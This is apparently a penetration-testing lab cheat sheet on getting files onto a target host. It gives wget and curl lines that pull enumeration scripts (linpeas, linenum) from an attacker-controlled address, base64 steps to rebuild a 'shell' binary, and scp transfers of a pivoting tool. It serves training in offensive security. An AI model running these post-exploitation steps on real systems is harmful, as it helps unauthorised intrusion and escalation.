# Transferring Files

| Command                                                | Description                                                 |
| ------------------------------------------------------ | ----------------------------------------------------------- |
| `python3 -m http.server 8000`                          | Start a local webserver                                     |
| `wget http://10.10.14.1:8000/linpeas.sh`               | Download a file on the remote server from our local machine |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download a file on the remote server from our local machine |
| `base64 shell -w 0`                                    | Convert a file to `base64`                                  |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell`      | Convert a file from `base64` back to its origin             |
| `md5sum shell`                                         | Check the file’s `md5sum` to ensure it converted correctly  |

## Transferring files using SCP

### Transfer a folder

`scp -r rpivot ubuntu@10.129.84.139:/home/ubuntu/`

### Transfer a file

`scp linenum.sh user@remotehost:/tmp/linenum.sh`
